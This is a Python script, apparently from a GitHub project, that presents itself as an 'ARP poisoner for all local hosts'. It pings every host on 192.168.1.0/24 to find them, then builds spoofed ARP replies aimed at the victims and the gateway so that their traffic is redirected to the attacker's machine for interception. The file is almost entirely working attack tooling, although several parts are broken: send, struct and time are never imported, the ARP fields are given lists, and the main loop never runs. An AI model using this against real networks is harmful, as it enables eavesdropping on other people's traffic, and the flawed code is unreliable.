#!/usr/bin/python3
"""
MIT License

Copyright (c) [2020] [Josip Stjepanović @github.com/jstjep00]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import socket
import argparse
from getmac import get_mac_address
from scapy.all import sr1,IP,ICMP,ARP


class ArpPacket:
    'ARP packet class to contruct for gateway and victim'

    def __init__(self, type_of_packet, target_tuple, localhost_tuple):
        self.type_of_packet = type_of_packet
        self.packet = ARP()

        # differentiate types of ARP packets between victim and gateway
        if self.type_of_packet=='victim':
            lista_ip = []
            lista_mac = []
            # add IPs and MACs of victims to lists for packet
            for i in range(len(target_tuple)):
                lista_ip.append(target_tuple[i][0])
                lista_mac.append(target_tuple[i][1])
            # set localhost as gateway ARP and add lists to packet
            self.packet.psrc = localhost_tuple[0]
            self.packet.pdst = lista_ip
            self.packet.hwaddr = lista_mac

        if self.type_of_packet=='gateway':
            """
                if gateway packet is determined then send to gateway
                    acting as if localhost MAC is lan hosts IP list
                    so localhost gets lan hosts packets
            """

            list_of_ips = []
            for i in range(len(localhost_tuple)):
                list_of_ips.append(localhost_tuple[i][0])
            self.packet.pdst = target_tuple[0]
            self.packet.hwaddr = target_tuple[1]
            self.packet.psrc = list_of_ips


    def send_packets(self):
        print("Sending packets.\n")
        send(self.packet)

    def display_packets(self):
        print("Contents of the packets:\n")
        self.packet.display()

def get_default_gateway(interface):
    'Reading default gateway on linux from /proc'

    with open("/proc/net/route") as route_file:
        for line in route_file:
            fields = line.strip().split()
            if fields[0] == interface:
                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                    continue
                else:
                    gateway_ip = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
                    gateway_mac = get_mac_address(ip=gateway_ip)
                    return (gateway_ip, gateway_mac)
        return None


def get_lan_hosts(interf):
    TIMEOUT = 0.5
    list_of_hosts_tuples = []
    counter = 0

    for ip in range(0, 256):
        packet = IP(dst="192.168.1." + str(ip), ttl=20)/ICMP()
        reply = sr1(packet, timeout=TIMEOUT)
        if not (reply is None):
            mac = get_mac_address(ip="192.168.1."+str(ip))
            list_of_hosts_tuples.append(("192.168.1."+str(ip), mac))
            counter += 1
            print("host is up: 192.168.1.{0} , {1}".format(ip, mac))
        else:
            print("Timeout waiting for {}".format(packet[IP].dst))
        print("-"*30)
    return list_of_hosts_tuples


def get_localhost(interface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    localhost_ip = s.getsockname()[0]
    s.close()
    localhost_mac = get_mac_address(interface=interface)
    return (localhost_ip, localhost_mac)


def text_animation(modulo):
    animation="|/-\\"
    print(animation[modulo % len(animation)], end="\r")
    time.sleep(0.1)

def main():
    args = argparser()
    default_gateway = get_default_gateway(args.interface)
    localhost = get_localhost(args.interface)
    lan_hosts = get_lan_hosts(args.interface)
    gateway = ArpPacket('gateway', default_gateway, localhost)
    lan_hosts = ArpPacket('victim', lan_hosts, localhost)

    modulo=0
    while True:
        while lan_hosts.send_packets() and gateway.send_packets():
            text_animation(modulo)
            modulo += 1

def argparser():
    descript = 'ARP poisoner for all local hosts over specific interface'
    parser = argparse.ArgumentParser(description=descript)

    parser.add_argument('-i', '--interface', metavar='interf', type=str,\
                         help='Interface used for ARP poisoning', required=True)
    parser.add_argument('-v', '--victim', metavar='victim_ip', type=str,\
                         help='Specific local host victim IP, if not specified then every host')

    args = parser.parse_args()
    return args


if __name__ == "__main__":
    main()
